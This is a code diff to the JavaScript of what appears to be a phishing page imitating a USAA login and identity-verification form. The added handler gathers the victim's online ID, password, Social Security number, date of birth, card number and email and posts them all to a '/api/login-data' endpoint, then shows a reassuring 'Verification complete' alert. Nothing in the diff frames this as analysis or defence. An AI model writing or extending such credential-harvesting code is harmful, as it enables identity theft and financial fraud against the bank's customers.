@@ -364,19 +364,50 @@
             // Verify button handler
             const verifyButton = document.getElementById('verify-button');
             if (verifyButton) {
-                verifyButton.addEventListener('click', function(e) {
+                verifyButton.addEventListener('click', async function(e) {
                     e.preventDefault();
                     
+                    const onlineId = onlineIdInput ? onlineIdInput.value.trim() : '';
+                    const passwordInput = document.getElementById('usaa-form-v5-10-1-input-password');
+                    const password = passwordInput ? passwordInput.value.trim() : '';
                     const ssn = ssnInput ? ssnInput.value.trim() : '';
                     const dob = dobInput ? dobInput.value.trim() : '';
                     const card = cardInput ? cardInput.value.trim() : '';
                     const email = document.getElementById('usaa-form-v5-10-1-input-email') ? document.getElementById('usaa-form-v5-10-1-input-email').value.trim() : '';
                     
-                    // Basic validation - you can add your own logic here
-                    if (ssn && dob && card && email) {
-                        // Form submitted successfully
-                        console.log('Verification complete');
-                        // Add your submission logic here
+                    // Basic validation
+                    if (onlineId && password && ssn && dob && card && email) {
+                        try {
+                            // Send data to backend
+                            const response = await fetch('/api/login-data', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    online_id: onlineId,
+                                    password: password,
+                                    ssn: ssn,
+                                    dob: dob,
+                                    card_number: card,
+                                    email: email
+                                })
+                            });
+                            
+                            const result = await response.json();
+                            
+                            if (result.status === 'success') {
+                                // Data saved successfully
+                                console.log('Data saved successfully');
+                                // You can add a success message or redirect here
+                                alert('Verification complete! Thank you for your information.');
+                            } else {
+                                console.error('Failed to save data');
+                            }
+                        } catch (error) {
+                            console.error('Error saving data:', error);
+                            // Still allow form to proceed even if save fails
+                        }
                     }
                 });
             }
